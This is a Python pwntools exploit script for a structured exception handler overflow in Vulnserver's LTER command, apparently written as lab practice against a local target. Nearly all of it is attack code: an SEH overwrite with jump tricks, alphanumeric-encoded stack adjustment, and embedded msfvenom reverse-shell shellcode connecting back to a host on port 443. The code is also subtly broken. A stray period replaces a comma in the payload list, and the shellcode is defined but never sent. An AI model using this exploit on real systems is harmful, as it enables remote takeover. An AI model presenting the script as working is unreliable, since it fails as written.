#!/usr/bin/python3

# ============================================
# Vulnserver LTER exploit via SEH
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"LTER /.:/"  # this should cause the crash
crash = 4000  # a payload of this size triggers the crash
offset = 3515
junk = b"A" * offset

cyclic_pattern = cyclic_metasploit(4000)

# === SEH ===

nseh = b"\x74\x08\x75\x03" # Jump Net techique(JZ 0x8, JNZ 0x4). This will bypass ascii restrictions as well
seh = p32(0x6250160a)  # pop pop ret - find with !mona seh

# === First Jump ===
#zeroeax = asm("and eax, 0x554e4d4a; and eax, 0x2a313235;") # for zeroing eax
zeroeax = asm("and eax, 0x10101010; and eax, 0x01010101;")

# Sub encoding

# this works, dont touch
adjstack = asm("push esp; pop eax; add ax, 0x135b; push eax; pop esp") # adjust the stack to the end of the program, which is 4955 bytes(135B) away)

jumpback = zeroeax + asm("sub eax, 0x7f7f7f4d; sub eax, 0x78706f6c; sub eax, 0x777f4048; push eax;") # setting eax to call eax



# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("50594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a49396c6d386e6247704770755043506c496b5536516f3073546e6b563044706c4b7142344c4c4b336237644c4b50727578544f5837515a71365031796f4e4c674c3061616c3662664c675059514a6f466d466149574d325872427261474c4b436236704c4b426a356c6e6b704c67613078797353787551685156316e6b5279675057714e336e6b526944585a43356a70496e6b56544c4b777168567561396f6c6c4b717a6f766d7551684767484b5034354c364333334d6c38474b734d51343075597473686e6b763844644331485362464c4b344c526b4e6b5638554c333139434c4b33344c4b755148504c49526446446754336b736b50614369727a7051396f4d30314f614f305a6e6b4762486b4c4d514d335876536652333037704358725774336472536f70543358704c634777566447696f4a754d684a3035515770755036494a6450543050324846496b30524b35504b4f5855327046306270505053707050573070505538686a544f594f4970496f5a756a37724a76655538695049384c51633165384332733065514d6b6f793976335a34505056636750684a396f55307473514b4f4a754b354b705344644c6b4f726e544843456a4c45385a504d654d725636396f785550684243706d617463306e69697351473147314730316966635a62324279463638626b4d3246595732647574556c466175516e6d3154464456703846677032646274327072766636514633767276704e7636614666336276453833496a6c756f6b36396f68556b395970526e72763046396f5030653875584f77354d7170796f38556d6b4970454d346a444a31786f566d456d6d6d4d496f6855474c6666634c544a4b30696b5970625547754d6b715734537432624f424a733056334b4f5a754141")
#junk = b"A" * (offset -len(shellcode))

payload = b"".join([
    vulncmd,
    junk,
    nseh,
    seh,
    b"\x47"*3, # "inc edi" add this in place of NOPs(bad char) because the jump is funky
    adjstack,
    jumpback.
    asm("sub ax, 0x3571")

])

payload += b"\x47" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[+] Payload sent!")
s.close()
